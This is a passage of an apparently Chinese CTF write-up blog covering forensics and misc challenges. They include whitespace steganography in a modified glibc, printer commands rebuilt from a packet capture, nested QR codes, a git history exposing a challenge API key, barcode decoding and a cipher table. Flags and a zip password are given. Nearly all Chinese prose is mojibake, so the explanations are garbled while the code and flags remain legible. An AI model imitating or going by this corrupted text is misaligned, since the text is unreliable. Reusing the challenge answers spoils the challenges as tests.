class="built_in">puts</span>(<span class="string">&quot;sorry~there is no flag&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;but maybe your can find something useful!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éŸ³é¢‘ä¸­è€ƒè™‘å­˜åœ¨éšå†™ï¼Œå› æ­¤å°è¯•ä½¿ç”¨ SilentEye å°è¯• Decodeï¼Œå¾—åˆ°äº†å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619785170884/0fff21ffad708894d53adce50bf0f09b4510612e.png"></p><p>ä½¿ç”¨ <code>This1sThe3rdZIPpwd</code> ä½œä¸ºå¯†ç è§£å‹æ—¥è®° 3ã€‚å¯ä»¥å¾—åˆ°ä¸€ä»½æ—¥è®°å’Œ libc çš„æºç ã€‚ä» NEWS ä¸­å¯ä»¥å¾—åˆ°ç‰ˆæœ¬ä¿¡æ¯ <code>Version 2.28</code>ã€‚ä» GitHub ä¸Šä¸‹è½½å¯¹åº”çš„æºç ï¼Œç„¶åç”¨ Diff Merge åšæ¯”å¯¹ã€‚æ ¹æ®æ—¥è®°ä¸­çš„æš—ç¤ºå¯ä»¥çŸ¥é“ä¿¡æ¯ç•™å­˜åœ¨ä»£ç ä¸­ï¼Œå› æ­¤æ¯”å¯¹ä¸€ä¸‹æ›´æ”¹å³å¯ã€‚</p><blockquote><p><a href="https://github.com/bminor/glibc/tree/3c03baca37fdcb52c3881e653ca392bba7a99c2b">https://github.com/bminor/glibc/tree/3c03baca37fdcb52c3881e653ca392bba7a99c2b</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619801149914/5fe37a86d125627e668512ba8efb9f780d0dbaca.png"></p><p>å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶çš„ä»£ç é‡Œå¢åŠ äº†å¾ˆå¤šç©ºæ ¼ã€‚æ­¤æ—¶å†æ¢åˆ° Beyond Compare æ¯”å¯¹ä¸€ä¸‹å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼ŒçŒœæµ‹è¿™äº›ç©ºæ ¼ä¸­ç¡®å®éšè—äº†ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619802917513/76c172704eed10ca2c598d0a31f80221c78d3029.png"></p><p>ä½¿ç”¨å¦‚ä¸‹çš„ CyberChef Receipt å¯ä»¥å¾—åˆ°å…¶ä¸­çš„ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Diff(&#39;\\n\\n\\n\\n\\n&#39;,&#39;Character&#39;,true,true,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;&#125;,&#39;0&#39;,true,false,false,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t&#39;&#125;,&#39;1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\n&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;000000000&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Binary(&#39;None&#39;,8)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Extract from arena.c</span><br><span class="line">your flag is in malloc.c</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Extract from rtld.c</span><br><span class="line">SOS! please help me -&gt; rtld.c</span><br></pre></td></tr></table></figure><p>å¯¹ malloc.c æå–ä¿¡æ¯å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWCTF&#123;code_steganography_1s_funny!&#125;</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-printer"><a href="#RCTF2019-printer" class="headerlink" title="[RCTF2019]printer"></a>[RCTF2019]printer</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œå¯å¾—å¦‚ä¸‹å†…å®¹ï¼Œ</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">BAR 348, 439, 2, 96 </span><br><span class="line">BAR 292, 535, 56, 2 </span><br><span class="line">BAR 300, 495, 48, 2 </span><br><span class="line">BAR 260, 447, 2, 88 </span><br><span class="line">BAR 204, 447, 56, 2 </span><br><span class="line">BAR 176, 447, 2, 96 </span><br><span class="line">BAR 116, 455, 2, 82 </span><br><span class="line">BAR 120, 479, 56, 2 </span><br><span class="line">BAR 44, 535, 48, 2 </span><br><span class="line">BAR 92, 455, 2, 80 </span><br><span class="line">BAR 20, 455, 72, 2 </span><br><span class="line">BAR 21, 455, 2, 40 </span><br><span class="line">BAR 21, 495, 24, 2 </span><br><span class="line">BAR 45, 479, 2, 16 </span><br><span class="line">BAR 36, 479, 16, 2 </span><br><span class="line">BAR 284, 391, 40, 2 </span><br><span class="line">BAR 324, 343, 2, 48 </span><br><span class="line">BAR 324, 287, 2, 32 </span><br><span class="line">BAR 276, 287, 48, 2 </span><br><span class="line">BAR 52, 311, 48, 2 </span><br><span class="line">BAR 284, 239, 48, 2 </span><br><span class="line">BAR 308, 183, 2, 56 </span><br><span class="line">BAR 148, 239, 48, 2 </span><br><span class="line">BAR 196, 191, 2, 48 </span><br><span class="line">BAR 148, 191, 48, 2 </span><br><span class="line">BAR 68, 191, 48, 2 </span><br><span class="line">BAR 76, 151, 40, 2 </span><br><span class="line">BAR 76, 119, 2, 32 </span><br><span class="line">BAR 76, 55, 2, 32 </span><br><span class="line">BAR 76, 55, 48, 2 </span><br><span class="line">BAR 112, 535, 64, 2 </span><br><span class="line">BAR 320, 343, 16, 2 </span><br><span class="line">BAR 320, 319, 16, 2 </span><br><span class="line">BAR 336, 319, 2, 24 </span><br><span class="line">BAR 56, 120, 24, 2 </span><br><span class="line">BAR 56, 87, 24, 2 </span><br><span class="line">BAR 56, 88, 2, 32 </span><br><span class="line">BAR 224, 247, 32, 2 </span><br><span class="line">BAR 256, 215, 2, 32 </span><br><span class="line">BAR 224, 215, 32, 2 </span><br><span class="line">BAR 224, 184, 2, 32 </span><br><span class="line">BAR 224, 191, 32, 2 </span><br><span class="line">BAR 272, 311, 2, 56 </span><br><span class="line">BAR 216, 367, 56, 2 </span><br><span class="line">BAR 216, 319, 2, 48 </span><br><span class="line">BAR 240, 318, 2, 49 </span><br><span class="line">BAR 184, 351, 2, 16 </span><br><span class="line">BAR 168, 351, 16, 2 </span><br><span class="line">BAR 168, 311, 2, 40 </span><br><span class="line">BAR 152, 351, 16, 2 </span><br><span class="line">BAR 152, 351, 2, 16</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯æ‰¾åˆ°æ‰“å°æœºçš„æ–‡æ¡£ã€‚</p><blockquote><p><a href="http://www.kroyeuropedownload.com/English_User_Manuals/TSPL_TSPL2_Programming_Jan_2017.pdf">http://www.kroyeuropedownload.com/English_User_Manuals/TSPL_TSPL2_Programming_Jan_2017.pdf</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619857758744/c0f6f3dcad14151a48e8e3c518c2b0281178029b.png"></p><p>æ ¹æ®è§„åˆ™ä½¿ç”¨ Python å°†å›¾ç‰‡ç”»å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">barcmds = [cmd.replace(<span class="string">&quot;BAR&quot;</span>, <span class="string">&quot;&quot;</span>).strip().split(<span class="string">&quot;,&quot;</span>) <span class="keyword">for</span> cmd <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;barcmds&quot;</span>, <span class="string">&quot;r&quot;</span>).readlines()]</span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">500</span>, <span class="number">600</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> barcmds:</span><br><span class="line">    bar = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="built_in">int</span>(cmd[<span class="number">2</span>]), <span class="built_in">int</span>(cmd[<span class="number">3</span>])), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>))</span><br><span class="line">    image.paste(bar, (<span class="built_in">int</span>(cmd[<span class="number">0</span>]), <span class="built_in">int</span>(cmd[<span class="number">1</span>])))</span><br><span class="line">image = image.rotate(<span class="number">180</span>)</span><br><span class="line">image.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619863407310/69df5e90d7fbc0e9c714544ecf43ef43aef09db9.png@300w" alt="image-20210501180326759"></p><p>æµé‡ä¸­è¿˜åŒ…å«äº† bitmap çš„æ•°æ®ï¼Œæ ¹æ®æ–‡æ¡£ä¸­çš„æè¿°å¯çŸ¥å…¶ç»“æ„ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619864785244/54cb2b6ee5a0f0cf7d05d146f9e22c74635f9366.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619864866827/52fa39cdcccc3ab704b2d2bd168a845f6fb4c445.png"></p><p>å› æ­¤å°†æŒ‡å®šéƒ¨åˆ†æ•°æ®æå–å‡ºæ¥åç”¨å¦‚ä¸‹ CyberChef Receipt å¤„ç†å³å¯å¾—åˆ°å‰©ä¸‹éƒ¨åˆ†çš„ flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#39;Auto&#39;)</span><br><span class="line">To_Binary(&#39;None&#39;,8)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\xff&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,1,208)</span><br><span class="line">Rotate_Image(180)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619865002536/ac6f30af5426ef86b05724805d8c552883fe18b8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;my_tsc_hc3pnikdk&#125;</span><br></pre></td></tr></table></figure><h3 id="b01lers2020-matryoshka"><a href="#b01lers2020-matryoshka" class="headerlink" title="[b01lers2020]matryoshka"></a>[b01lers2020]matryoshka</h3><p>é™„ä»¶ç»™å‡ºçš„å›¾ç‰‡ä¸­æœ‰ä¸åŒå‘çš„è‰è“ï¼Œä½¿ç”¨è„šæœ¬å°†æ•°æ®å¤„ç†ä¸€ä¸‹ç„¶åä½¿ç”¨ CyberChef é‡æ–°æ¸²æŸ“å›¾ç‰‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;matryoshka.png&quot;</span>)</span><br><span class="line">offset = <span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(offset, image.width, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(offset, image.height, <span class="number">50</span>):</span><br><span class="line">        (r, g, b) = image.getpixel((x, y))</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span> <span class="keyword">if</span> r != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\xFF&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,2,121)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619867652603/70d38bbeaf26cff1eb1ea7931979e516427a2552.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å·¥å…·æ‰«æå¯å¾—ä¸€ä¸ª GZIP æ–‡ä»¶ã€‚</p><blockquote><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p></blockquote><p>ä½¿ç”¨å¦‚ä¸‹çš„ CyberChef Receipt å¤„ç†å¯ä»¥å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">From_Hexdump()</span><br><span class="line">Gunzip()</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;l&#39;&#125;,&#39;\\xFF&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,2,86)</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰«æå¾—å‡ºçš„äºŒç»´ç åç”¨å¦‚ä¸‹ CyberChef Receipt å¤„ç†å¯å¾—åˆ°åˆä¸€ä¸ªäºŒç»´ç ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From_Hexdump()</span><br><span class="line">Render_Image(&#39;Raw&#39;)</span><br><span class="line">Invert_Image()</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰«æäºŒç»´ç åå¯å¾—ä¸€ä¸ª 7z æ–‡ä»¶çš„æ•°æ®ï¼Œç¨å¾®å¤„ç†åå°†å…¶æ‰“å¼€ã€‚ä½¿ç”¨å¼±å¯†ç å°è¯•å¯å¾—å‹ç¼©åŒ…å¯†ç ä¸º 1234ã€‚å°†å‹ç¼©åŒ…è§£å‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pctf&#123;dolls_do_get_boring_after_a_while&#125;</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-OIçš„æ¢¦"><a href="#NPUCTF2020-OIçš„æ¢¦" class="headerlink" title="[NPUCTF2020]OIçš„æ¢¦"></a>[NPUCTF2020]OIçš„æ¢¦</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619874114080/cc1b99f63ca59054e8a407ed8779a7635bceab28.png"></p><p>çŸ©é˜µå¿«é€Ÿå¹‚å¯ä»¥è§£å†³ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°å¦‚ä¸‹ä»£ç ç¤ºä¾‹ã€‚ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ç¤ºä¾‹çš„ä»£ç ã€‚</p><blockquote><p><a href="https://blog.csdn.net/bianxia123456/article/details/105167294/">https://blog.csdn.net/bianxia123456/article/details/105167294/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mulMatrix</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    ans = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">                ans[i][j] += x[i][k] * y[k][j]</span><br><span class="line">                ans[i][j] %= <span class="number">10003</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quickMatrix</span>(<span class="params">m, n</span>):</span></span><br><span class="line">    E = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">        E[i][i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (n):</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            E = mulMatrix(E, m)</span><br><span class="line">        m = mulMatrix(m, m)</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">matrix = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>)]</span><br><span class="line">dataIn = <span class="built_in">open</span>(<span class="string">&quot;yyh.in&quot;</span>, <span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">n, m, steps = dataIn[<span class="number">0</span>].strip().split()</span><br><span class="line">m = <span class="built_in">int</span>(m)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, m):</span><br><span class="line">    i, j = dataIn[x + <span class="number">1</span>].strip().split()</span><br><span class="line">    i = <span class="built_in">int</span>(i)</span><br><span class="line">    j = <span class="built_in">int</span>(j)</span><br><span class="line">    matrix[i][j] = <span class="number">1</span></span><br><span class="line">    matrix[j][i] = <span class="number">1</span></span><br><span class="line">ans = quickMatrix(matrix, <span class="built_in">int</span>(steps))</span><br><span class="line"><span class="built_in">print</span>(ans[<span class="number">1</span>][<span class="built_in">int</span>(n)])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5174&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-smart-sensors-api"><a href="#INSHack2017-smart-sensors-api" class="headerlink" title="[INSHack2017]smart-sensors-api"></a>[INSHack2017]smart-sensors-api</h3><p>é¢˜ç›®ç»™å‡ºçš„æ˜¯ä¸€ä¸ª .git æ–‡ä»¶å¤¹ï¼Œ<code>git restore</code> è¿˜åŸä¸€ä¸‹å¯ä»¥å¾—åˆ°ä¸€äº›ä»£ç ã€‚æŸ¥çœ‹ log ä¹‹åä½¿ç”¨æŒ‡ä»¤ <code>git diff ef45d97c8fe2c8ff03192d2ec96570dd0edbad01</code> æ¯”å¯¹å¯ä»¥å¾—åˆ°å¦‚ä¸‹å…³é”®ä¿¡æ¯ã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-[APP]</span></span><br><span class="line"><span class="deletion">-debug=false</span></span><br><span class="line"><span class="deletion">-locale=fr_FR.UTF-8</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-[USER]</span></span><br><span class="line"><span class="deletion">-api_key=EF6960F6128EB18B861320D5622A79B33DE717B60278888C89DFAB82403CADD641C662EBBAF05D4FC5CC2EDD1CB5F667B6E540EE7ECFA053F5E4C70C803BC928</span></span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œè·å¾—äº† api_keyï¼Œä¹‹åçš„æ­¥éª¤æ˜¯ä½¿ç”¨ api_key è¯·æ±‚ APIã€‚</p><h3 id="BSidesSF2019-delta"><a href="#BSidesSF2019-delta" class="headerlink" title="[BSidesSF2019]delta"></a>[BSidesSF2019]delta</h3><p>å°†é™„ä»¶ä¸­å›¾ç‰‡çš„ç¼©ç•¥å›¾ä½¿ç”¨ <code>exiftool -b -ThumbnailImage attachment.jpg &gt; extract3.jpg</code> æå–å‡ºæ¥ä¹‹åä½¿ç”¨ Beyond Compare è¿›è¡Œæ¯”è¾ƒå¯ä»¥å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621617008283/96116f7952fdce036dc24e19a3ba585c0df56e00.png"></p><blockquote><p><a href="https://en.wikipedia.org/wiki/Code_128">https://en.wikipedia.org/wiki/Code_128</a></p></blockquote><p>å‚è€ƒ Wikipedia çš„åšæ³•ï¼Œ<code>The width of each bar or space may be 1, 2, 3 or 4 units (modules).</code>ï¼Œå°†æ¡ç è½¬å†™æˆå¦‚ä¸‹æ•°å­—ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2112141313212134111323114121214131111421122411121421124131111122141222311422111112421221141113411212412331112</span><br></pre></td></tr></table></figure><p>å¯¹ç…§ Start Code 211214 å¯çŸ¥åº”è¯¥ç”¨ 128B æ¥è§£ç å…¶ä¸­çš„å†…å®¹ã€‚åŒæ—¶æ•°å­—å°¾éƒ¨çš„ 2331112 æ˜¯ Stop patternï¼Œå› æ­¤éœ€è¦è§£ç çš„ä¸»è¦æ˜¯ä¸­é—´çš„å†…å®¹ã€‚å°†å…¶å¯¹ç…§ç è¡¨éƒ¨åˆ†è§£ç åå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;minime.jpg&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¾ŠåŸæ¯-2020-signin"><a href="#ç¾ŠåŸæ¯-2020-signin" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]signin"></a>[ç¾ŠåŸæ¯ 2020]signin</h3><blockquote><p><a href="https://eprint.iacr.org/2020/301.pdf">https://eprint.iacr.org/2020/301.pdf</a></p></blockquote><p>MadHatter cipherï¼Œå…¶å¯†ç è¡¨å¦‚ä¸‹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1621650676508/d097bf92d84dd5b60ebc0cf653472ee7136ec3c0.png"></p><p>å°†å¯†ç è¡¨å€’åºå¾—åˆ°æœ¬é¢˜çš„å¯†ç è¡¨ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ACEG Y</span><br><span class="line">ACEH X</span><br><span class="line">ACEI W</span><br><span class="line">ACFG V</span><br><span class="line">ACFH U</span><br><span class="line">ACFI S</span><br><span class="line">ADEG Q</span><br><span class="line">ADEH P</span><br><span class="line">ADEI O</span><br><span class="line">ADFG N</span><br><span class="line">ADFH L</span><br><span class="line">ADFI K</span><br><span class="line">BCEG I</span><br><span class="line">BCEH G</span><br><span class="line">BCEI F</span><br><span class="line">BCFG C</span><br><span class="line">BCFH B</span><br><span class="line">BCFI R</span><br><span class="line">BDEG E</span><br><span class="line">BDEH T</span><br><span class="line">BDEI H</span><br><span class="line">BDFG D</span><br><span class="line">BDFH A</span><br><span class="line">BDFI H</span><br></pre></td></tr></table></figure><p>å°†é™„ä»¶ä¸­çš„ä¿¡æ¯å››ä½ä¸€ç»„æŒ‰ç…§ä¸Šè¿°å¯†ç è¡¨è½¬å†™ï¼Œå³å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;TOYSAYGREENTEAISCOOL&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¾ŠåŸæ¯-2020-TCP-IP"><a href="#ç¾ŠåŸæ¯-2020-TCP-IP" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]TCP_IP"></a>[ç¾ŠåŸæ¯ 2020]TCP_IP</h3><p>ä½¿ç”¨ <code>tshark.exe -r attachment.pcap -T fields -e ip.id &gt; data.txt</code> 